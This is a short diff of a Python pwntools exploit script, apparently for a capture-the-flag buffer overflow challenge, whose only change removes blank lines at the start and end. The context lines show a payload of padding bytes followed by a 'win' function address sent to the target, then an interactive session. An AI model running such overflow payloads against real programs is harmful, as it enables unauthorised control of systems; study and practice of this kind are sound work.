@@ -1,4 +1,3 @@
-
 from pwn import *
 
 
@@ -29,4 +28,3 @@ payload = b'a'*padding + p64(win_addr)
 r.sendline(payload)
 
 r.interactive()
-
